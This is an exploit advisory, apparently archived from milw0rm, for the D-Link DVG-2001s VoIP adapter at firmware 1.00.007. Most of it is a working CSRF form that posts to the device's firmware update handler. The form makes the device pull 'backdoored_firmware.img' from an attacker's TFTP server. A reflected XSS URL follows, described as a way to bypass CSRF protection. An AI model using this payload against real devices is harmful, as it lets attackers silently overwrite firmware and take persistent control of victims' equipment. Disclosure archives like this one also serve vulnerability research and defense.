@@ -1,0 +1,23 @@
+D-link VoIP Phone Adapter XSS and XSRF(remote firmware overwrite)
+model number: DVG-2001s
+f/w version 1.00.007
+
+Better than just remote code execution,  you control the firmware.
+
+<html>
+	<form action="http://10.1.1.166/Forms/cbi_Set_SW_Update?16640,0,0,0,0,0,0,0,0"
+method="POST">
+		<input name="page_HiddenVar" value="0">
+		<input name="TFTPServerAddress1" value="10">
+		<input name="TFTPServerAddress2" value="1">
+		<input name="TFTPServerAddress3" value="1">
+		<input name="TFTPServerAddress4" value="1">
+		<input name="FirmwareUpdate" value="enabled">
+		<input name="FileName" value="backdoored_firmware.img">
+		<input type=submit value="attack">
+	</form>
+</html>
+and xss which can be used for csrf bypass:
+http://10.1.1.166/Forms/page_CfgDevInfo_Set?%3Cscript%3Ealert(%22hacked%22)%3C/script%3E
+
+# milw0rm.com [2009-01-29]
